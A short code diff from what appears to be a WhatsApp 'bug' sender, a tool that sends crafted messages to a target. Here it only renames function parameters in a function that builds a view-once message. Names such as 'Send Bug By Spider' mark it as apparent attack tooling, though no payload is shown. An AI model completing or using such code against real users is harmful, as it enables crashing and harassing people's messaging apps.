@@ -430,7 +430,7 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			console.log(chalk.green("Send Bug By Spider〽️"));
 		};
 		
-				async function ClPmNull(sam, Qrad, sam, cct = false, ptcp = false) {
+				async function ClPmNull(target, Qrad, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
 				proto.Message.fromObject({
 					viewOnceMessage: {
